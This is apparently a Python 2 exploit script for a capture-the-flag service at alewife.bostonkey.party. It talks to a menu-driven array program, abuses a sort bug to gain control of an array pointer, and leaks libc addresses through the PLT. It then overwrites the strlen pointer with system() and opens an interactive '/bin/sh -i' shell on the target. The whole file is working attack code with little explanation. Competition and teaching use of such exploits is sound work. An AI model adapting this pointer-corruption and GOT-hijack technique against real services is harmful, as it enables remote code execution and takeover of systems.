import sys
from socket import *
import ast

TARGET = ('alewife.bostonkey.party', 8888)

s = socket()
s.connect(TARGET)

def rd(*suffixes):
    out = ''
    while 1:
        x = s.recv(1)
        if not x:
            raise EOFError()
        sys.stdout.write(x)
        sys.stdout.flush()
        out += x

        for suffix in suffixes:
            if out.endswith(suffix):
                break
        else:
            continue
        break
    return out

def pr(x):
    s.send(x)
    print "<%s" % x

def seq(*cmds):
    for cmd in cmds:
        rd(': '); pr(str(cmd))

INTEGER = 2
STRING = 3

class union:
    def create(self):
        seq(1, 1)
        return int(rd('\n'))

    def op_insert_ints(self, i, vals):
        seq(1, 2, i, 1, len(vals), *vals)
        return int(rd('\n'))
    def op_insert_strs(self, i, vals):
        seq(1, 2, i, 2, len(vals), *vals)
        return int(rd('\n'))
    def op_pop(self, i):
        seq(1, 2, i, 4)
        return int(rd('\n'))
    def op_int_minuseq(self, i, a, b):
        seq(1, 2, i, 7, a, b)
        return int(rd('\n'))
    def op_int_pluseq(self, i, a, b):
        seq(1, 2, i, 8, a, b)
        return int(rd('\n'))
    def op_str_pluseq(self, i, a, b):
        seq(1, 2, i, 9, a, b)
        return int(rd('\n'))

    def delete(self, i):
        seq(1, 3, i)
        return int(rd('\n'))
    def print_(self, i):
        seq(1, 4, i)
        bit = rd('\n')
        if bit.startswith('['):
            out = bit + rd('\n]\n')
            res = rd('\n') # result code
            return out
        else:
            return bit
    def copyto(self, i, type):
        seq(1, 5, i, type)
        return int(rd('\n'))        
union = union()

class intarr:
    def delete(self, i):
        seq(2, 3, i)
        return int(rd('\n'))
    def print_(self, i):
        seq(2, 4, i)
        bit = rd('\n')
        if bit.startswith('['):
            out = bit + rd('\n]\n')
            res = rd('\n') # result code
            return out
        else:
            return bit

    def op_insert_ints(self, i, vals):
        seq(2, 2, i, 1, len(vals), *vals)
        return int(rd('\n'))
    def op_sort(self, i):
        seq(2, 2, i, 3)
        return int(rd('\n'))
    def op_pop(self, i):
        seq(2, 2, i, 4)
        return int(rd('\n'))
intarr = intarr()

class strarr:
    def delete(self, i):
        seq(3, 3, i)
        return int(rd('\n'))
    def print_(self, i):
        seq(3, 4, i)
        bit = rd('\n')
        if bit.startswith('['):
            out = bit + rd('\n]\n')
            res = rd('\n') # result code
            return out
        else:
            return bit

    def op_insert_strs(self, i, vals):
        seq(3, 2, i, 2, len(vals), *vals)
        return int(rd('\n'))
    def op_sort(self, i):
        seq(3, 2, i, 3)
        return int(rd('\n'))
    def op_pop(self, i):
        seq(3, 2, i, 4) 
        return int(rd('\n'))
strarr = strarr()

x1 = union.create()
# use sort bug to increment the array pointer by one
union.op_insert_ints(x1, [0x6831d0])
union.op_insert_ints(x1, range(2000, 2000+255))
y1 = union.copyto(x1, INTEGER)
intarr.op_sort(y1)
#intarr.print_(y1)

# prepare a string variable with our target stuff
x2 = union.create()
union.op_insert_strs(x2, ["/bin/sh -i", "blah"])

# arr[255] is now the array pointer, so we can overwrite it arbitrarily
intarr.op_pop(y1)
intarr.op_insert_ints(y1, [0x602DB8])
addrs = ast.literal_eval(intarr.print_(y1)) # leak PLT addresses pointing to libc

libc_puts = 0x000000000006fe30
libc_system = 0x0000000000046640

libc_base = addrs[0] - libc_puts

for i in xrange(256 - 2):
    intarr.op_pop(y1)
# corrupt strlen pointer
intarr.op_insert_ints(y1, [libc_base + libc_system])

# trigger system
seq(1, 2, x2, 9, 0, 1) #union.op_str_pluseq(x2, 0, 1)
while 1:
    rd('$ ')
    pr(raw_input()+'\n')
